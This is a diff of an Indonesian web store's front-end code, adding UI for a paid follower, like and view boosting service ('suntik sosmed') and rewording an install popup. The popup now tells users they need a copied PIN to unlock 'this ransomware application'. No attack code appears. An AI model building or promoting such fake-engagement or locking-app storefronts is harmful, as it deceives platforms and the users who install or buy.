@@ -34245,18 +34245,18 @@ body.kz-home-populer-active #sbFilterResults .item-card .badge-ribbon{
       '  <div class="kz-install-guard-body">' +
       '    <div class="kz-install-guard-alert">' +
       '      <i class="fas fa-triangle-exclamation"></i>' +
-      '      <div><b>Salin kode terlebih dahulu</b><p>Sebelum install aplikasi Kzrizusmo ranstoreee, salin kode di bawah ini. Tombol lanjutkan baru akan muncul setelah kode berhasil disalin.</p></div>' +
+      '      <div><b>Salin pin terlebih dahulu</b><p>Sebelum install aplikasi, salin pin di bawah ini, jika tidak maka anda tidak dapat membuka kunci dari aplikasi ransomware ini.</p></div>' +
       '    </div>' +
       '    <div class="kz-install-guard-codebox">' +
-      '      <div class="kz-install-guard-label">Kode wajib disalin</div>' +
+      '      <div class="kz-install-guard-label">Pin wajib disalin</div>' +
       '      <div class="kz-install-guard-code" id="kzInstallGuardCode"></div>' +
       '    </div>' +
       '    <div class="kz-install-guard-actions">' +
-      '      <button type="button" class="kz-install-guard-btn primary" id="kzInstallGuardCopy"><i class="fas fa-copy"></i><span>Salin Kode</span></button>' +
+      '      <button type="button" class="kz-install-guard-btn primary" id="kzInstallGuardCopy"><i class="fas fa-copy"></i><span>Salin Pin</span></button>' +
       '      <button type="button" class="kz-install-guard-btn secondary" id="kzInstallGuardContinue"><i class="fas fa-circle-check"></i><span>Konfirmasi Lanjutkan</span></button>' +
       '    </div>' +
-      '    <div class="kz-install-guard-success" id="kzInstallGuardSuccess">Kode berhasil disalin. Silakan lanjutkan ke link install.</div>' +
-      '    <div class="kz-install-guard-hint">Kode: <b>' + COPY_CODE + '</b></div>' +
+      '    <div class="kz-install-guard-success" id="kzInstallGuardSuccess">Pin berhasil disalin. Silakan lanjutkan ke link install.</div>' +
+      '    <div class="kz-install-guard-hint">Pin: <b>' + COPY_CODE + '</b></div>' +
       '  </div>' +
       '</div>';
     document.body.appendChild(overlay);
@@ -34320,16 +34320,16 @@ body.kz-home-populer-active #sbFilterResults .item-card .badge-ribbon{
   function doCopy(text){
     if(navigator.clipboard && navigator.clipboard.writeText){
       return navigator.clipboard.writeText(text).then(function(){
-        showToast('Kode berhasil disalin ✅');
+        showToast('Pin berhasil disalin ✅');
         return true;
       }).catch(function(){
         var ok = fallbackCopy(text);
-        if(ok) showToast('Kode berhasil disalin ✅');
+        if(ok) showToast('Pin berhasil disalin ✅');
         return ok;
       });
     }
     var ok = fallbackCopy(text);
-    if(ok) showToast('Kode berhasil disalin ✅');
+    if(ok) showToast('Pin berhasil disalin ✅');
     return Promise.resolve(ok);
   }
 
@@ -34420,10 +34420,10 @@ body.light-mode .kz-sosmed-check{background:rgba(0,0,0,.03);border-color:rgba(0,
     field.className = 'pay-field';
     field.id = 'paySosmedPublicField';
     field.innerHTML = ''
-      + '<label class="pay-label">Konfirmasi akun target :</label>'
+      + '<label class="pay-label">Konfirmasi target :</label>'
       + '<div class="kz-sosmed-check" id="paySosmedPublicWrap">'
       + '  <input id="paySosmedPublicCheck" name="social_public_check" type="checkbox" />'
-      + '  <label for="paySosmedPublicCheck">Saya sudah memastikan akun target dalam keadaan <b>publik</b> dan <b>bukan private</b>.<small>Wajib diceklis sebelum kirim pembayaran untuk order Suntik Sosmed.</small></label>'
+      + '  <label for="paySosmedPublicCheck">Akun saya dalam keadaan <b>publik</b>.<small>Akun private mengakibatkan proses tidak masuk/gagal.</small></label>'
       + '</div>';
     anchor.insertAdjacentElement('afterend', field);
 
@@ -34573,6 +34573,586 @@ body.light-mode .kz-sosmed-check{background:rgba(0,0,0,.03);border-color:rgba(0,
   if(document.readyState === 'loading') document.addEventListener('DOMContentLoaded', bootDom, {once:true});
   else bootDom();
   try{ window.addEventListener('pageshow', bootDom); }catch(e){}
+})();
+</script>
+
+
+
+<style id="kz-sosmed-finish-info-style">
+.kz-sosmed-note-card{margin-top:14px;padding:14px;border-radius:18px;border:1px solid rgba(255,255,255,.12);background:linear-gradient(180deg,rgba(255,255,255,.05),rgba(0,0,0,.18));box-shadow:0 16px 38px rgba(0,0,0,.18)}
+.kz-sosmed-note-card[hidden]{display:none !important}
+.kz-sosmed-note-head{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-weight:1000;font-size:14px;letter-spacing:.04em;text-transform:uppercase}
+.kz-sosmed-note-head i{color:var(--primary)}
+.kz-sosmed-note-body{margin:0;white-space:pre-wrap;line-height:1.55;font-size:12px;color:var(--text-main);font-family:inherit}
+.kz-sosmed-mini{margin-top:10px;padding:10px 12px;border-radius:14px;border:1px solid rgba(255,255,255,.10);background:rgba(255,255,255,.04);font-size:12px;line-height:1.5;color:var(--text-sec)}
+.kz-sosmed-mini b{color:var(--text-main)}
+body.light-mode .kz-sosmed-note-card{background:linear-gradient(180deg,rgba(0,0,0,.03),rgba(0,0,0,.02));border-color:rgba(0,0,0,.10)}
+body.light-mode .kz-sosmed-mini{background:rgba(0,0,0,.03);border-color:rgba(0,0,0,.08)}
+</style>
+<script id="kz-sosmed-finish-info-patch">
+(function(){
+  if(window.__kzSosmedFinishInfoPatchApplied) return;
+  window.__kzSosmedFinishInfoPatchApplied = true;
+
+  var NOTE_TEXT = `𝗘𝗦𝗧𝗜𝗠𝗔𝗦𝗜 𝗣𝗘𝗦𝗔𝗡𝗔𝗡 𝗦𝗘𝗟𝗘𝗦𝗔𝗜 𝟭-𝟮𝟰 𝗝𝗔𝗠
+
+ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴘᴇᴍᴇꜱᴀɴᴀɴ ꜱᴜɴᴛɪᴋ ꜱᴏꜱᴍᴇᴅ ꜰᴏʟʟᴏᴡᴇʀꜱ, ʟɪᴋᴇ, ᴅᴀɴ ᴠɪᴇᴡꜱ ᴅɪ kzrizusmo🙏
+________________________________________________
+𝗖𝗮𝘁𝗮𝘁𝗮𝗻 𝗣𝗲𝗻𝘁𝗶𝗻𝗴 ‼️
+𝗛𝗮𝗿𝗮𝗽 𝗗𝗶𝗯𝗮𝗰𝗮 𝗔𝗴𝗮𝗿 𝗧𝗶𝗱𝗮𝗸 𝗧𝗲𝗿𝗷𝗮𝗱𝗶 𝗞𝗲𝗻𝗱𝗮𝗹𝗮 𝗦𝗮𝗮𝘁 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝘂𝗻𝘁𝗶𝗸 𝗕𝗲𝗿𝗹𝗮𝗻𝗴𝘀𝘂𝗻𝗴.
+
+#ᴀᴋᴜɴ ᴊᴀɴɢᴀɴ ᴅɪᴋᴜɴᴄɪ ᴀᴛᴀᴜ ᴅɪᴘʀɪᴠᴀᴛ ꜱᴀᴀᴛ ꜱᴜɴᴛɪᴋ, ᴋᴀʀᴇɴᴀ ɪɴɪ ᴀᴋᴀɴ ᴍᴇᴍʙᴜᴀᴛ ꜰᴏʟʟᴏᴡᴇʀꜱ ᴛɪᴅᴀᴋ ᴍᴀꜱᴜᴋ.
+#ᴊᴀɴɢᴀɴ ᴍᴇɴɢɢᴀɴᴛɪ ɴᴀᴍᴀ/ᴜꜱᴇʀɴᴀᴍᴇ ꜱᴇʙᴇʟᴜᴍ ᴘʀᴏꜱᴇꜱ ꜱᴜɴᴛɪᴋ ꜱᴇʟᴇꜱᴀɪ ᴋᴀʀᴇɴᴀ ᴍᴇᴍʙᴜᴀᴛ ɢᴀɢᴀʟ ꜱᴜɴᴛɪᴋ.
+#ꜱᴇʟᴀᴍᴀ ᴘʀᴏꜱᴇꜱ ꜱᴜɴᴛɪᴋ ɪɢ/ᴛɪᴋᴛᴏᴋ/ᴛᴡɪᴛᴛᴇʀ (ᴛᴀʀɢᴇᴛ ᴛᴜᴊᴜᴀɴ) ʙɪꜱᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ꜱᴄʀᴏʟʟ ꜱᴏꜱᴍᴇᴅ
+#ᴊɪᴋᴀ ᴘᴇꜱᴀɴᴀɴ ʙᴇʟᴜᴍ ᴍᴀꜱᴜᴋ ᴅᴀʟᴀᴍ ᴇꜱᴛɪᴍᴀꜱɪ ᴍᴀᴋꜱɪᴍᴀʟ ʏᴀɴɢ ᴅɪᴛᴇɴᴛᴜᴋᴀɴ, ʜᴀʀᴀᴘ ʙᴇʀꜱᴀʙᴀʀ ᴅᴀɴ ʟᴀᴘᴏʀ ᴋᴇ ᴀᴅᴍɪɴ ᴀɢᴀʀ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴘᴇɴɢᴇᴄᴇᴋᴀɴ ᴋᴇᴍʙᴀʟɪ ᴘᴇꜱᴀɴᴀɴ
+#ᴘʀᴏꜱᴇꜱ ᴇꜱᴛɪᴍᴀꜱɪ ꜱᴇʟᴇꜱᴀɪ ʙɪꜱᴀ ᴍᴇʟᴇʙɪʜɪ ᴇꜱᴛɪᴍᴀꜱɪ ɴᴏʀᴍᴀʟ, ᴇꜱᴛɪᴍᴀꜱɪ ᴍᴀᴋꜱ 1-3 ʜᴀʀɪ
+#ɪɴɢɪɴ ɢᴀʀᴀɴsɪ? sᴇᴛᴇʟᴀʜ ꜱᴜɴᴛɪᴋ, ᴊᴀɴɢᴀɴ ᴍᴇᴍᴘʀɪᴠᴀᴛ ᴀᴋᴜɴ.
+#ᴊɪᴋᴀ ᴛᴇʀᴊᴀᴅɪ ꜰᴏʟʟᴏᴡᴇʀꜱ ᴅʀᴏᴘ/ᴛᴜʀᴜɴ ᴄʜᴀᴛ ᴀᴅᴍɪɴ ᴅᴀʟᴀᴍ 1x24 ᴊᴀᴍ ꜱᴛᴇʟᴀʜ ᴘᴇᴍᴇꜱᴀɴᴀɴ.
+#ᴘʀᴏꜱᴇꜱ ʀᴇꜰɪʟʟ / ɪꜱɪ ᴜʟᴀɴɢ ɢʀᴀᴛɪꜱ ᴍᴇᴍʙᴜᴛᴜʜᴋᴀɴ ᴡᴀᴋᴛᴜ 1-5 ʜᴀʀɪ, ᴊɪᴋᴀ ʙᴇʟᴜᴍ ꜱᴇʟᴇꜱᴀɪ ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ᴀɢᴀʀ ᴅɪᴘʀᴏꜱᴇꜱ ᴜʟᴀɴɢ.
+#ɢᴀʀᴀɴꜱɪ ᴛɪᴅᴀᴋ ʙᴇʀʟᴀᴋᴜ ᴊɪᴋᴀ ᴀᴋᴜɴ ᴅɪ ᴘʀɪᴠᴀᴛ ᴡᴀʟᴀᴜᴘᴜɴ ꜱᴜᴅᴀʜ 1x24 ᴊᴀᴍ, ᴋᴀʀᴇɴᴀ ᴍᴇᴍᴘʀɪᴠᴀᴛ ᴀᴋᴜɴ ʙᴇʀᴘᴏᴛᴇɴꜱɪ ᴅʀᴏᴘ, ɴᴏ ɢᴀʀᴀɴꜱɪ.
+#ᴍᴇɴɢɢᴀɴᴛɪ ɴᴀᴍᴀ/ᴜꜱᴇʀɴᴀᴍᴇ ᴍᴇɴʏᴇʙᴀʙᴋᴀɴ ᴅʀᴏᴘ, ɴᴏ ɢᴀʀᴀɴꜱɪ.
+#ᴊɪᴋᴀ ᴀɴᴅᴀ ᴍᴇɴɢɪʀɪᴍ ᴀᴛᴀᴜ ᴍᴇᴍʙᴜᴀᴛ ʟᴀᴘᴏʀᴀɴ ᴅʀᴏᴘ  ᴘᴀᴅᴀ ꜱᴀᴀᴛ ᴊᴀᴍɪɴᴀɴ ɢᴀʀᴀɴꜱɪ ʙᴇʀʟᴀᴋᴜ, ᴅᴀɴ ᴘᴇꜱᴀɴᴀɴ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴛᴇʀᴇꜰɪʟʟ ꜱᴀᴍᴘᴀɪ ᴘᴇʀɪᴏᴅᴇ ᴊᴀᴍɪɴᴀɴ ɢᴀʀᴀɴꜱɪ ʙᴇʀᴀᴋʜɪʀ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴘᴇɴɢᴇᴍʙᴀʟɪᴀɴ ᴅᴀɴᴀ ᴜɴᴛᴜᴋ ᴋᴀꜱᴜꜱ ɪɴɪ.
+#ᴘʀᴏꜱᴇꜱ ʀᴇꜰɪʟʟ ʙɪꜱᴀ ᴍᴇɴɢᴀʟᴀᴍɪ ᴋᴇɴᴅᴀʟᴀ, ᴊᴀᴅɪ ʜᴀʀᴜꜱ ᴅɪʀᴇꜰɪʟʟ ʙᴇʀᴋᴀʟɪ2 ʙᴀʀᴜ ɴᴏʀᴍᴀʟ.
+#ʀᴇꜰɪʟʟ ʙɪꜱᴀ ᴍᴇᴍᴀᴋᴀɴ ᴡᴀᴋᴛᴜ 3-7 ʜᴀʀɪ ʙᴇʀɢᴀɴᴛᴜɴɢ ᴀɴᴛʀɪᴀɴ (ᴏᴛᴏᴍᴀᴛɪꜱ ꜱɪꜱᴛᴇᴍ)
+#ᴘʀᴏꜱᴇꜱ ʀᴇꜰɪʟʟ ᴡᴀᴊɪʙ ᴀᴋᴜɴ ᴛɪᴅᴀᴋ ᴅɪᴘʀɪᴠᴀᴛ ᴅᴀɴ ᴏᴘꜱɪ ᴛɪɴᴊᴀᴜ ᴅɪᴍᴀᴛɪᴋᴀɴ (ᴋʜᴜꜱᴜꜱ ꜰᴏʟʟᴏᴡᴇʀꜱ ɪɴꜱᴛᴀɢʀᴀᴍ)
+#ᴊɪᴋᴀ ᴘᴇꜱᴀɴᴀɴ ʙᴇʟᴜᴍ ᴍᴀꜱᴜᴋ, ꜱɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ᴋᴇᴍʙᴀʟɪ ᴜɴᴛᴜᴋ ᴅɪᴄᴇᴋ ᴀᴅᴍɪɴ ᴀɢᴀʀ ᴅɪᴘʀᴏꜱᴇꜱ ᴜʟᴀɴɢ, ᴋᴀʀᴇɴᴀ ꜱᴇʙᴀɢɪᴀɴ ᴏʀᴅᴇʀ ᴍᴇɴɢᴀʟᴀᴍɪ ᴇʀʀᴏʀ ᴘʀᴏꜱᴇꜱ, ᴘᴀʀᴛɪᴀʟ, ᴅᴀɴ ᴘᴇɴᴅɪɴɢ.
+
+Salam Hangat  
+@kzrizusmo`;
+
+  function byId(id){ return document.getElementById(id); }
+  function lower(v){ return String(v || '').toLowerCase(); }
+  function isSosmedPay(){
+    try{ return !!(window.payState && payState.isSosmed); }catch(e){ return false; }
+  }
+  function productLooksSosmed(name){
+    var s = lower(name);
+    return /(suntik\s*sosmed|followers?|likes?|views?|subscriber|subscribers|reaction|retweet|tweet|threads|twitter|instagram|tiktok|channel members|channel reaction|poll votes|shopee followers|konten|audit)/.test(s);
+  }
+  function looksSosmedOrder(obj){
+    if(!obj) return false;
+    try{
+      if(obj.isSosmed || obj.sosmedInfoRequired) return true;
+      if(obj.receipt && (obj.receipt.isSosmed || obj.receipt.sosmedInfoRequired)) return true;
+    }catch(e){}
+    return productLooksSosmed(obj.product || obj.productName || (obj.receipt && obj.receipt.product) || '');
+  }
+  function ensureSuccessNote(){
+    var actions = byId('paySuccessActions');
+    if(!actions) return null;
+    var box = byId('kzSosmedSuccessNote');
+    if(!box){
+      box = document.createElement('div');
+      box.id = 'kzSosmedSuccessNote';
+      box.className = 'kz-sosmed-note-card';
+      box.hidden = true;
+      box.innerHTML = '<div class="kz-sosmed-note-head"><i class="fas fa-bullhorn"></i><span>Informasi Suntik Sosmed</span></div><pre class="kz-sosmed-note-body"></pre>';
+      var anchor = byId('kzSuccessExtra') || actions;
+      anchor.parentNode.insertBefore(box, actions);
+    }
+    return box;
+  }
+  function renderSuccessNote(){
+    var box = ensureSuccessNote();
+    if(!box) return;
+    var show = false;
+    try{
+      var successShown = (byId('paySuccessView') && getComputedStyle(byId('paySuccessView')).display !== 'none');
+      show = !!(successShown && isSosmedPay());
+    }catch(e){ show = false; }
+    box.hidden = !show;
+    if(show){
+      var pre = box.querySelector('.kz-sosmed-note-body');
+      if(pre) pre.textContent = NOTE_TEXT;
+      var est = byId('kzSuccessEstimate');
+      if(est) est.textContent = 'estimasi 1-24 jam';
+    }
+  }
+  function ensureReceiptNote(){
+    var anchor = byId('receiptText');
+    if(!anchor) return null;
+    var box = byId('kzSosmedReceiptNote');
+    if(!box){
+      box = document.createElement('div');
+      box.id = 'kzSosmedReceiptNote';
+      box.className = 'kz-sosmed-note-card';
+      box.hidden = true;
+      box.innerHTML = '<div class="kz-sosmed-note-head"><i class="fas fa-circle-info"></i><span>Informasi Suntik Sosmed</span></div><pre class="kz-sosmed-note-body"></pre>';
+      anchor.parentNode.insertBefore(box, anchor);
+    }
+    return box;
+  }
+  function renderReceiptNote(ctx){
+    var box = ensureReceiptNote();
+    if(!box) return;
+    var show = looksSosmedOrder(ctx || window.__kzReceiptCtx || window.payState || null);
+    box.hidden = !show;
+    if(show){
+      var pre = box.querySelector('.kz-sosmed-note-body');
+      if(pre) pre.textContent = NOTE_TEXT;
+    }
+  }
+  function enrichStoredOrder(){
+    try{
+      if(!isSosmedPay() || !window.payState || !payState.orderId || typeof authFindOrderByAnyId !== 'function' || typeof authUpsertOrder !== 'function') return;
+      var order = authFindOrderByAnyId(payState.orderId);
+      if(!order) return;
+      order.isSosmed = true;
+      order.sosmedInfoRequired = true;
+      order.sosmedEstimate = '1-24 JAM';
+      order.sosmedInfoText = NOTE_TEXT;
+      if(order.receipt && typeof order.receipt === 'object'){
+        order.receipt.isSosmed = true;
+        order.receipt.sosmedInfoRequired = true;
+      }
+      authUpsertOrder(order);
+    }catch(e){}
+  }
+  function decorateOrderCards(){
+    var list = byId('authMyOrdersList');
+    if(!list) return;
+    var cards = list.querySelectorAll('.kz-order-card');
+    cards.forEach(function(card){
+      try{
+        var btn = card.querySelector('.kz-order-actions .kz-order-btn');
+        if(!btn) return;
+        var onclick = btn.getAttribute('onclick') || '';
+        var m = onclick.match(/kzOpenOrderReceipt\('([^']+)'\)/);
+        if(!m) return;
+        var order = (typeof authFindOrderByAnyId === 'function') ? authFindOrderByAnyId(m[1]) : null;
+        var old = card.querySelector('.kz-sosmed-mini');
+        if(old) old.remove();
+        if(!looksSosmedOrder(order)) return;
+        var info = document.createElement('div');
+        info.className = 'kz-sosmed-mini';
+        info.innerHTML = '<b>Estimasi selesai 1-24 jam.</b><br>Detail catatan suntik sosmed tersedia saat tombol <b>Lihat Detail</b> dibuka.';
+        card.appendChild(info);
+      }catch(e){}
+    });
+  }
+
+  var oldCapture = window.authCaptureFromPayState;
+  if(typeof oldCapture === 'function'){
+    window.authCaptureFromPayState = function(){
+      var res = oldCapture.apply(this, arguments);
+      enrichStoredOrder();
+      setTimeout(decorateOrderCards, 40);
+      return res;
+    };
+  }
+
+  var oldBuildReceiptUI = window.buildReceiptUI;
+  if(typeof oldBuildReceiptUI === 'function'){
+    window.buildReceiptUI = function(ctx){
+      var res = oldBuildReceiptUI.apply(this, arguments);
+      renderReceiptNote(ctx || window.__kzReceiptCtx || window.payState || null);
+      return res;
+    };
+  }
+
+  var oldOpenOrderReceipt = window.kzOpenOrderReceipt;
+  if(typeof oldOpenOrderReceipt === 'function'){
+    window.kzOpenOrderReceipt = function(){
+      var res = oldOpenOrderReceipt.apply(this, arguments);
+      setTimeout(function(){ renderReceiptNote(window.__kzReceiptCtx || null); }, 10);
+      return res;
+    };
+  }
+
+  var oldOpenReceiptFromSuccess = window.kzOpenReceiptFromSuccess;
+  if(typeof oldOpenReceiptFromSuccess === 'function'){
+    window.kzOpenReceiptFromSuccess = function(){
+      var res = oldOpenReceiptFromSuccess.apply(this, arguments);
+      setTimeout(function(){ renderReceiptNote(window.__kzReceiptCtx || window.payState || null); }, 10);
+      return res;
+    };
+  }
+
+  var oldRenderOrdersPremium = window.renderOrdersPremium;
+  if(typeof oldRenderOrdersPremium === 'function'){
+    window.renderOrdersPremium = function(){
+      var res = oldRenderOrdersPremium.apply(this, arguments);
+      decorateOrderCards();
+      return res;
+    };
+  }
+
+  function boot(){
+    ensureSuccessNote();
+    ensureReceiptNote();
+    renderSuccessNote();
+    renderReceiptNote(window.__kzReceiptCtx || window.payState || null);
+    decorateOrderCards();
+  }
+
+  if(document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot, {once:true});
+  else boot();
+  setInterval(renderSuccessNote, 900);
+  try{ window.addEventListener('pageshow', boot); }catch(e){}
+})();
+</script>
+
+
+<style id="kz-v4-order-detail-and-sosmed-page-style">
+#kzSosmedReadPage{position:fixed;inset:0;z-index:14050;display:none;align-items:center;justify-content:center;padding:18px 14px;background:rgba(0,0,0,.84);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px)}
+#kzSosmedReadPage.show{display:flex}
+#kzSosmedReadPage .kz-sosmed-read-card{width:min(760px,100%);max-height:calc(100dvh - 28px);display:flex;flex-direction:column;border-radius:24px;border:1px solid rgba(255,255,255,.12);background:linear-gradient(180deg,rgba(20,20,20,.96),rgba(8,8,8,.98));box-shadow:0 30px 90px rgba(0,0,0,.58);overflow:hidden}
+#kzSosmedReadPage .kz-sosmed-read-head{padding:16px 16px 12px;border-bottom:1px solid rgba(255,255,255,.08)}
+#kzSosmedReadPage .kz-sosmed-read-title{font-size:19px;font-weight:1000;line-height:1.2;letter-spacing:.02em}
+#kzSosmedReadPage .kz-sosmed-read-sub{margin-top:6px;font-size:12px;line-height:1.5;color:var(--text-sec)}
+#kzSosmedReadPage .kz-sosmed-read-body{padding:14px 16px 8px;overflow:auto;-webkit-overflow-scrolling:touch;flex:1 1 auto}
+#kzSosmedReadPage .kz-sosmed-read-note{margin:0;white-space:pre-wrap;line-height:1.56;font-size:12px;color:var(--text-main);font-family:inherit}
+#kzSosmedReadPage .kz-sosmed-read-foot{padding:12px 16px calc(14px + env(safe-area-inset-bottom,0px));border-top:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.03)}
+#kzSosmedReadPage .kz-sosmed-read-check{display:flex;align-items:flex-start;gap:10px;padding:12px 12px;border-radius:16px;border:1px solid rgba(255,255,255,.10);background:rgba(255,255,255,.04);font-size:12px;line-height:1.45;color:var(--text-main)}
+#kzSosmedReadPage .kz-sosmed-read-check input{margin-top:2px;accent-color:var(--primary);width:18px;height:18px;flex:0 0 auto}
+#kzSosmedReadPage .kz-sosmed-read-btn{width:100%;margin-top:12px;padding:14px 14px;border:0;border-radius:16px;font-weight:1000;letter-spacing:.02em;background:linear-gradient(135deg,#ff0000,#b00000);color:#fff;cursor:pointer;box-shadow:0 16px 38px rgba(255,0,0,.18)}
+#kzSosmedReadPage .kz-sosmed-read-btn:disabled{opacity:.52;cursor:not-allowed;box-shadow:none;filter:saturate(.65)}
+#authMyOrdersList .kz-order-btn{cursor:pointer;pointer-events:auto}
+#kzSosmedSuccessNote{display:none !important}
+body.light-mode #kzSosmedReadPage .kz-sosmed-read-card{background:linear-gradient(180deg,rgba(255,255,255,.98),rgba(246,246,242,.98));border-color:rgba(0,0,0,.08);box-shadow:0 24px 70px rgba(0,0,0,.16)}
+body.light-mode #kzSosmedReadPage .kz-sosmed-read-foot{background:rgba(0,0,0,.02);border-top-color:rgba(0,0,0,.08)}
+body.light-mode #kzSosmedReadPage .kz-sosmed-read-check{background:rgba(0,0,0,.03);border-color:rgba(0,0,0,.08)}
+</style>
+<script id="kz-v4-order-detail-and-sosmed-page-script">
+(function(){
+  if(window.__kzV4OrderDetailAndSosmedPage) return;
+  window.__kzV4OrderDetailAndSosmedPage = true;
+
+  function byId(id){ return document.getElementById(id); }
+  function txt(el){ return String((el && el.textContent) || '').trim(); }
+  function currentOrderId(){
+    var id = txt(byId('paySuccessOrderId'));
+    if(id) return id;
+    try{ if(window.payState && payState.orderId) return String(payState.orderId); }catch(e){}
+    return '';
+  }
+  function ensureReadPage(){
+    var page = byId('kzSosmedReadPage');
+    if(page) return page;
+    page = document.createElement('div');
+    page.id = 'kzSosmedReadPage';
+    page.innerHTML = ''
+      + '<div class="kz-sosmed-read-card" role="dialog" aria-modal="true" aria-label="Informasi penting suntik sosmed">'
+      + '  <div class="kz-sosmed-read-head">'
+      + '    <div class="kz-sosmed-read-title">Baca dulu ya kak, ini informasi penting suntik sosmed</div>'
+      + '    <div class="kz-sosmed-read-sub">kesalahan pelanggan tidak mendapatkan garansi</div>'
+      + '  </div>'
+      + '  <div class="kz-sosmed-read-body" id="kzSosmedReadBody"><pre class="kz-sosmed-read-note" id="kzSosmedReadText"></pre></div>'
+      + '  <div class="kz-sosmed-read-foot">'
+      + '    <label class="kz-sosmed-read-check"><input id="kzSosmedReadCheck" type="checkbox"><span>Saya sudah membaca.</span></label>'
+      + '    <button class="kz-sosmed-read-btn" id="kzSosmedReadBtn" type="button" disabled>Lanjut ke Halaman Selesai</button>'
+      + '  </div>'
+      + '</div>';
+    document.body.appendChild(page);
+    var check = byId('kzSosmedReadCheck');
+    var btn = byId('kzSosmedReadBtn');
+    if(check && btn){
+      check.addEventListener('change', function(){ btn.disabled = !check.checked; });
+    }
+    if(btn){
+      btn.addEventListener('click', function(){
+        try{
+          var orderId = currentOrderId() || '__current__';
+          window.__kzSosmedReadAckMap = window.__kzSosmedReadAckMap || {};
+          window.__kzSosmedReadAckMap[orderId] = true;
+        }catch(e){}
+        page.classList.remove('show');
+      });
+    }
+    return page;
+  }
+  function getSosmedNoteText(){
+    var note = byId('kzSosmedSuccessNote');
+    var pre = note ? note.querySelector('.kz-sosmed-note-body') : null;
+    var val = txt(pre);
+    if(val) return val;
+    var receipt = byId('kzSosmedReceiptNote');
+    pre = receipt ? receipt.querySelector('.kz-sosmed-note-body') : null;
+    return txt(pre);
+  }
+  function syncSosmedReadPage(){
+    var page = ensureReadPage();
+    var successView = byId('paySuccessView');
+    var noteBox = byId('kzSosmedSuccessNote');
+    var successShown = !!(successView && getComputedStyle(successView).display !== 'none');
+    var isSosmed = !!(noteBox && noteBox.hidden === false);
+    var orderId = currentOrderId() || '__current__';
+    window.__kzSosmedReadAckMap = window.__kzSosmedReadAckMap || {};
+    if(!successShown || !isSosmed){
+      page.classList.remove('show');
+      page.dataset.kzActiveOrderId = '';
+      return;
+    }
+    var body = byId('kzSosmedReadBody');
+    var pre = byId('kzSosmedReadText');
+    var check = byId('kzSosmedReadCheck');
+    var btn = byId('kzSosmedReadBtn');
+    if(pre){ pre.textContent = getSosmedNoteText(); }
+    if(window.__kzSosmedReadAckMap[orderId]){
+      page.classList.remove('show');
+      page.dataset.kzActiveOrderId = orderId;
+      return;
+    }
+    var isNewOpen = page.dataset.kzActiveOrderId !== orderId || !page.classList.contains('show');
+    if(isNewOpen){
+      if(check) check.checked = false;
+      if(btn) btn.disabled = true;
+      if(body) body.scrollTop = 0;
+    }
+    page.dataset.kzActiveOrderId = orderId;
+    page.classList.add('show');
+  }
+
+  function wireOrderButtons(){
+    var list = byId('authMyOrdersList');
+    if(!list) return;
+    list.querySelectorAll('.kz-order-card').forEach(function(card){
+      var code = txt(card.querySelector('.kz-order-code'));
+      var btns = card.querySelectorAll('.kz-order-actions .kz-order-btn');
+      if(btns[0]){
+        btns[0].removeAttribute('onclick');
+        btns[0].setAttribute('data-order-id', code);
+        btns[0].classList.add('kz-order-detail-btn');
+      }
+      if(btns[1]){
+        btns[1].removeAttribute('onclick');
+        btns[1].setAttribute('data-order-id', code);
+        btns[1].classList.add('kz-order-copy-btn');
+      }
+    });
+  }
+  function bindOrderActions(){
+    if(window.__kzOrderActionsBound) return;
+    window.__kzOrderActionsBound = true;
+    document.addEventListener('click', function(ev){
+      var detailBtn = ev.target.closest('#authMyOrdersList .kz-order-detail-btn');
+      if(detailBtn){
+        ev.preventDefault();
+        ev.stopPropagation();
+        var code = String(detailBtn.getAttribute('data-order-id') || '').trim();
+        if(code && typeof window.kzOpenOrderReceipt === 'function') window.kzOpenOrderReceipt(code);
+        return;
+      }
+      var copyBtn = ev.target.closest('#authMyOrdersList .kz-order-copy-btn');
+      if(copyBtn){
+        ev.preventDefault();
+        ev.stopPropagation();
+        var code2 = String(copyBtn.getAttribute('data-order-id') || '').trim();
+        if(!code2) return;
+        try{
+          if(navigator.clipboard && navigator.clipboard.writeText){
+            navigator.clipboard.writeText(code2);
+            if(typeof authToast === 'function') authToast('Kode order berhasil disalin ✅');
+          }
+        }catch(e){}
+      }
+    }, true);
+  }
+
+  var oldRenderOrdersPremium = window.renderOrdersPremium;
+  if(typeof oldRenderOrdersPremium === 'function'){
+    window.renderOrdersPremium = function(){
+      var res = oldRenderOrdersPremium.apply(this, arguments);
+      setTimeout(wireOrderButtons, 0);
+      return res;
+    };
+  }
+
+  var list = byId('authMyOrdersList');
+  if(list && !window.__kzOrderListObserver){
+    window.__kzOrderListObserver = new MutationObserver(function(){ wireOrderButtons(); });
+    window.__kzOrderListObserver.observe(list, {childList:true, subtree:true});
+  }
+
+  bindOrderActions();
+
+  var oldOpenReceipt = window.kzOpenOrderReceipt;
+  if(typeof oldOpenReceipt === 'function'){
+    window.kzOpenOrderReceipt = function(){
+      var res = oldOpenReceipt.apply(this, arguments);
+      return res;
+    };
+  }
+
+  function boot(){
+    ensureReadPage();
+    wireOrderButtons();
+    syncSosmedReadPage();
+  }
+  if(document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot, {once:true});
+  else boot();
+  setInterval(syncSosmedReadPage, 500);
+})();
+</script>
+
+
+<style id="kz-sosmed-link-url-validation-style">
+#paySosmedLinkInput.kz-invalid{
+  border-color:rgba(255,0,0,.55)!important;
+  box-shadow:0 0 0 2px rgba(255,0,0,.14)!important;
+}
+#paySosmedLinkHint{
+  display:none;
+  margin-top:8px;
+  font-size:12px;
+  line-height:1.45;
+  color:var(--text-sec);
+}
+#paySosmedLinkHint.kz-error{
+  display:block;
+  color:#ff8080;
+}
+</style>
+<script id="kz-sosmed-link-url-validation-patch">
+(function(){
+  if(window.__kzSosmedLinkUrlValidationPatchApplied) return;
